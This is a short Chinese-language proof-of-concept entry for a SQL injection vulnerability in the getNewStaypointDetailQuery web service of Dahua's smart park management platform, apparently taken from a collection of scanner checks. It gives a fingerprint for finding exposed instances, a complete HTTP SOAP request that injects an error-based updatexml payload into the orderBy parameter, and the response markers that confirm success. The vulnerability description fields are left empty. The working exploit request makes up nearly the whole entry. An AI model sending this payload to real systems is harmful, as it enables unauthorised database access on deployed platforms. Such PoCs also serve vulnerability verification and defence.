﻿# 大华智慧园区综合管理平台getNewStaypointDetailQuery SQL注入漏洞

> 更新时间：2024-03-29

> 漏洞编号：

> 漏洞说明：

> 漏洞特征：app="dahua-智慧园区综合管理平台"

> 验证脚本：HTTP

```
POST /portal/services/carQuery/getNewStaypointDetailQuery HTTP/1.1
Accept-Encoding: gzip, deflate
Accept: */*
Connection: close
Content-Type: text/xml;charset=UTF-8

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:car="http://carQuery.webservice.dssc.dahua.com">
<soapenv:Header/>
<soapenv:Body>
<car:getNewStaypointDetailQuery>
<!--type: string-->
<searchJson>{}</searchJson>
<!--type: string-->
<pageJson>{"orderBy":"1 and 1=updatexml(1,concat(0x7e,(select md5(1)),0x7e),1)--"}</pageJson>
<!--type: string-->
<extend>quae divum incedo</extend>
</car:getNewStaypointDetailQuery>
</soapenv:Body>
</soapenv:Envelope>
```

> 响应代码特征：200

> 响应内容特征：a0b923820dcc509a

> 上传文件定位：

> 验证文件来源：大华智慧园区综合管理平台getNewStaypointDetailQuery SQL注入漏洞.poc

